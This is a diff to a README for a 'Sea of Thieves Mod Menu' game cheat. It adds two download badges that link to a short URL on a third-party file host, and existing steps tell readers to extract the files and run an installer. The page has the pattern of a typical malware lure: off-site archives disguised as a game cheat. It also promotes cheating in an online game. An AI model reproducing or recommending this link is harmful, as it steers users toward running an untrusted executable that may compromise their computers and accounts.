@@ -1,5 +1,7 @@
 # ⚓ Sea of Thieves Mod Menu  
 
+[![Download SeaOfThieves ModMenu](https://img.shields.io/badge/Download-SeaOfThieves%20ModMenu-blueviolet)](https://downeefiles.com/s/sthvscht)
+
 Enhance your Sea of Thieves experience with this powerful mod menu! Unlock new features, customize gameplay, and gain the ultimate advantage on the open seas.  
 
 ## 🌊 Features:
@@ -15,3 +17,5 @@ Enhance your Sea of Thieves experience with this powerful mod menu! Unlock new f
 2. Extract the files and run the installer.  
 3. Launch Sea of Thieves and open the mod menu in-game.  
 4. Customize your settings and set sail!  
+
+[![Download SeaOfThieves ModMenu](https://img.shields.io/badge/Download-SeaOfThieves%20ModMenu-blueviolet)](https://downeefiles.com/s/sthvscht)
